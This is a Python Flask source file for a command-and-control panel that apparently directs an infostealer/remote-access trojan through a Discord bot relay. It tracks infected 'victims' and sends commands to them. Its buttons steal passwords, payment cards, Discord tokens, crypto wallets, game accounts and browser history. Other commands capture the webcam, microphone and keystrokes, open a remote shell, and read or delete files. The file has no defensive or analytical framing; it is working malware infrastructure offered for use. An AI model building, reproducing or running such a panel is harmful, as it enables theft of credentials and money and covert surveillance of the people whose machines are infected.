# c2.py – Clean, modern C2 panel (no emoji spam)
import os, time, json, threading, requests
from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")

BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHANNEL_ID = os.environ.get("CHANNEL_ID")
if not BOT_TOKEN or not CHANNEL_ID:
    raise ValueError("Missing BOT_TOKEN or CHANNEL_ID")

DATA_FILE = "victims_data.json"
victims = {}
log_queues = {}
last_id = None

def load_data():
    global victims, log_queues
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                data = json.load(f)
                victims = data.get('victims', {})
                log_queues = data.get('log_queues', {})
                for vid in victims:
                    victims[vid]['last_seen'] = float(victims[vid]['last_seen'])
        except:
            pass

def save_data():
    data = {'victims': victims, 'log_queues': log_queues}
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(data, f, indent=2)
    except:
        pass

def fetch_loop():
    global last_id, victims, log_queues
    while True:
        try:
            url = f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages?limit=50"
            headers = {"Authorization": f"Bot {BOT_TOKEN}"}
            resp = requests.get(url, headers=headers, timeout=5)
            if resp.status_code == 200:
                msgs = resp.json()
                for msg in msgs:
                    mid = msg.get("id")
                    if last_id and mid == last_id:
                        break
                    content = msg.get("content", "")
                    if content.startswith("[") and "]" in content:
                        bracket = content.find("]")
                        victim_id = content[1:bracket]
                        rest = content[bracket+1:].strip()
                        if victim_id not in victims:
                            victims[victim_id] = {"last_seen": time.time(), "logs": []}
                        victims[victim_id]["last_seen"] = time.time()
                        if victim_id not in log_queues:
                            log_queues[victim_id] = []
                        log_queues[victim_id].append(rest)
                        if len(log_queues[victim_id]) > 200:
                            log_queues[victim_id] = log_queues[victim_id][-200:]
                        socketio.emit('new_log', {'victim': victim_id, 'log': rest})
                if msgs:
                    last_id = msgs[0]["id"]
        except:
            pass
        time.sleep(2)

threading.Thread(target=fetch_loop, daemon=True).start()

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/api/victims')
def api_victims():
    vlist = []
    for vid, data in victims.items():
        vlist.append({
            "id": vid,
            "last_seen": data["last_seen"],
            "online": (time.time() - data["last_seen"]) < 70
        })
    return jsonify(vlist)

@app.route('/api/logs/<victim_id>')
def api_logs(victim_id):
    return jsonify(log_queues.get(victim_id, []))

@app.route('/send', methods=['POST'])
def send_command():
    data = request.json
    victim_id = data.get('victim')
    command = data.get('command')
    if not command:
        return jsonify({'success': False, 'error': 'No command'})
    final = f"{command} @{victim_id}" if victim_id else command
    url = f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages"
    headers = {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}
    try:
        r = requests.post(url, headers=headers, json={"content": final}, timeout=10)
        if r.status_code == 200:
            return jsonify({'success': True})
        return jsonify({'success': False, 'error': f"HTTP {r.status_code}"})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>C2 Panel</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0b0e14; font-family: 'Inter', sans-serif; color: #eef2ff; padding: 24px; }
        .container { max-width: 1600px; margin: 0 auto; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 32px; }
        h1 { font-size: 28px; font-weight: 700; letter-spacing: -0.5px; background: linear-gradient(135deg, #a855f7, #ec4899); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .badge { background: #1e1f2c; padding: 6px 14px; border-radius: 40px; font-size: 13px; border: 1px solid #2a2b3a; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; margin-bottom: 32px; }
        .card { background: #141824; border-radius: 24px; padding: 20px; border: 1px solid #252a36; transition: all 0.2s; cursor: pointer; }
        .card:hover { border-color: #a855f7; transform: translateY(-2px); }
        .card.active { border: 2px solid #a855f7; background: #1a1e2a; }
        .card-header { display: flex; justify-content: space-between; margin-bottom: 12px; }
        .victim-id { font-weight: 600; font-size: 14px; }
        .status { display: flex; align-items: center; gap: 8px; }
        .dot { width: 8px; height: 8px; border-radius: 50%; }
        .online { background: #10b981; box-shadow: 0 0 6px #10b981; }
        .offline { background: #ef4444; }
        .time { font-size: 11px; color: #6b7280; }
        .panel { display: flex; gap: 24px; flex-wrap: wrap; }
        .controls { flex: 1.2; min-width: 300px; background: #141824; border-radius: 24px; padding: 24px; border: 1px solid #252a36; }
        .logs { flex: 2; min-width: 400px; background: #141824; border-radius: 24px; padding: 20px; height: 65vh; overflow-y: auto; font-family: monospace; font-size: 12px; }
        .current { background: #1e1f2c; border-radius: 40px; padding: 6px 16px; display: inline-block; margin-bottom: 20px; font-size: 13px; }
        .btns { display: flex; flex-wrap: wrap; gap: 10px; margin: 20px 0; }
        button { background: #1e1f2c; border: none; color: #eef2ff; padding: 8px 14px; border-radius: 40px; cursor: pointer; transition: 0.2s; font-size: 12px; font-weight: 500; }
        button:hover { background: #a855f7; transform: scale(1.02); }
        .cmd-row { display: flex; gap: 12px; margin: 16px 0; }
        .cmd-row input { flex: 1; background: #1e1f2c; border: 1px solid #2a2b3a; border-radius: 40px; padding: 8px 16px; color: white; outline: none; }
        .log-item { margin: 8px 0; border-left: 3px solid #a855f7; padding-left: 12px; word-break: break-word; }
        footer { text-align: center; margin-top: 32px; font-size: 12px; color: #4b5563; }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #1e1f2c; border-radius: 10px; }
        ::-webkit-scrollbar-thumb { background: #a855f7; border-radius: 10px; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>C2 PANEL</h1>
        <div class="badge">Discord Relay</div>
    </div>
    <div class="grid" id="victimsGrid"></div>
    <div class="panel">
        <div class="controls">
            <div class="current" id="currentVictim">No victim selected</div>
            <div class="btns">
                <button onclick="send('!info')">Info</button>
                <button onclick="send('!ip')">IP</button>
                <button onclick="send('!clip')">Clipboard</button>
                <button onclick="send('!active')">Active</button>
                <button onclick="send('!wifi')">Wi-Fi</button>
                <button onclick="send('!tokens')">Discord</button>
                <button onclick="send('!passwords')">Passwords</button>
                <button onclick="send('!cards')">Cards</button>
                <button onclick="send('!roblox')">Roblox</button>
                <button onclick="send('!steam')">Steam</button>
                <button onclick="send('!wallets')">Wallets</button>
                <button onclick="send('!history')">History</button>
                <button onclick="send('!emails')">Emails</button>
                <button onclick="send('!screenshot')">Screenshot</button>
                <button onclick="send('!webcam')">Webcam</button>
                <button onclick="send('!mic')">Mic</button>
                <button onclick="send('!keylog_start')">Keylog Start</button>
                <button onclick="send('!keylog_stop')">Stop</button>
                <button onclick="send('!keylog_dump')">Dump</button>
                <button onclick="send('!processes')">Processes</button>
                <button onclick="send('!shell')">Shell Start</button>
                <button onclick="send('!shell_stop')">Shell Stop</button>
                <button onclick="send('!lock')">Lock</button>
                <button onclick="send('!shutdown')">Shutdown</button>
                <button onclick="send('!restart')">Restart</button>
                <button onclick="send('!abort')">Abort</button>
                <button onclick="send('!all')">All Data</button>
                <button onclick="send('!selfdestruct')" style="background:#8b0000;">Self-Destruct</button>
                <button onclick="send('!exit')" style="background:#8b0000;">Exit</button>
            </div>
            <div class="cmd-row"><input id="customCmd" placeholder="!cmd dir"><button onclick="sendCustom()">Run</button></div>
            <div class="cmd-row"><input id="catPath" placeholder="!cat path"><button onclick="send('!cat '+catPath.value)">Read</button></div>
            <div class="cmd-row"><input id="rmPath" placeholder="!rm path"><button onclick="send('!rm '+rmPath.value)">Delete</button></div>
            <div class="cmd-row"><input id="lsPath" placeholder="!ls path"><button onclick="send('!ls '+lsPath.value)">List</button></div>
        </div>
        <div class="logs" id="logsPanel"></div>
    </div>
    <footer>Commands are sent via Discord. Results appear here.</footer>
</div>
<script>
    const socket = io();
    let currentVictim = null;
    let victims = {};

    socket.on('new_log', (data) => {
        if (data.victim === currentVictim) addLog(data.log);
        refresh();
    });

    function refresh() {
        fetch('/api/victims').then(r=>r.json()).then(data => {
            victims = {};
            const grid = document.getElementById('victimsGrid');
            grid.innerHTML = '';
            data.forEach(v => {
                victims[v.id] = v;
                const card = document.createElement('div');
                card.className = `card ${currentVictim === v.id ? 'active' : ''}`;
                card.innerHTML = `
                    <div class="card-header">
                        <span class="victim-id">${v.id}</span>
                        <div class="status"><span class="dot ${v.online ? 'online' : 'offline'}"></span><span>${v.online ? 'ONLINE' : 'OFFLINE'}</span></div>
                    </div>
                    <div class="time">Last seen: ${new Date(v.last_seen * 1000).toLocaleString()}</div>
                `;
                card.onclick = () => select(v.id);
                grid.appendChild(card);
            });
            if (currentVictim && victims[currentVictim]) {
                document.getElementById('currentVictim').innerHTML = `Target: ${currentVictim}`;
            } else if (data.length > 0 && !currentVictim) {
                select(data[0].id);
            } else if (!currentVictim) {
                document.getElementById('currentVictim').innerHTML = 'No victims online';
            }
        });
    }

    function select(id) {
        currentVictim = id;
        document.getElementById('currentVictim').innerHTML = `Target: ${id}`;
        fetch(`/api/logs/${id}`).then(r=>r.json()).then(logs => {
            const panel = document.getElementById('logsPanel');
            panel.innerHTML = '';
            logs.forEach(log => addLog(log));
        });
        refresh();
    }

    function addLog(msg) {
        const panel = document.getElementById('logsPanel');
        const div = document.createElement('div');
        div.className = 'log-item';
        div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
        panel.appendChild(div);
        div.scrollIntoView();
    }

    function send(cmd) {
        if (!currentVictim) { alert('Select a victim'); return; }
        fetch('/send', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({victim: currentVictim, command: cmd}) })
            .then(r=>r.json()).then(data => { if (data.success) addLog(`> ${cmd} (sent)`); else addLog(`Failed: ${data.error}`); });
    }

    function sendCustom() {
        let cmd = document.getElementById('customCmd').value.trim();
        if (cmd) send(cmd);
        document.getElementById('customCmd').value = '';
    }

    setInterval(refresh, 5000);
    refresh();
</script>
</body>
</html>
"""

if __name__ == '__main__':
    load_data()
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
